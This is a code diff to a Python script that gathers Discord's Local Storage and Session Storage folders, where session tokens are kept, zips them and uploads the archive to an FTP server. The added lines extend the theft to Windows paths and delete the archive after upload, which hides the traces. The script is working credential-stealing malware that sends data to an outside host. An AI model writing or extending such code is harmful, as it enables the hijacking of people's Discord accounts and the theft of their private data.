@@ -29,6 +29,10 @@ try:
 
     if os_type == "Windows":
         print('Running on Windows system')
+        discord_lstorage = usr_home + '\\AppData\\Roaming\\discord\\Local Storage\\'
+        discord_sstorage = usr_home + '\\AppData\\Roaming\\discord\\Session Storage\\'
+        archive_location = usr_home + '\\AppData\\Local\\Temp\\' + zip_name
+
     elif os_type == "Linux":
         print('Running on Linux system')
         discord_lstorage = usr_home + '/.config/discord/Local Storage/'
@@ -57,5 +61,8 @@ try:
     fp = open(archive_location, 'rb')
     ftp.storbinary('STOR %s' % os.path.basename(zip_name), fp, 1024)
     fp.close()
+
+    os.remove(archive_location)
+
 except:
     print('Something went wrong!')
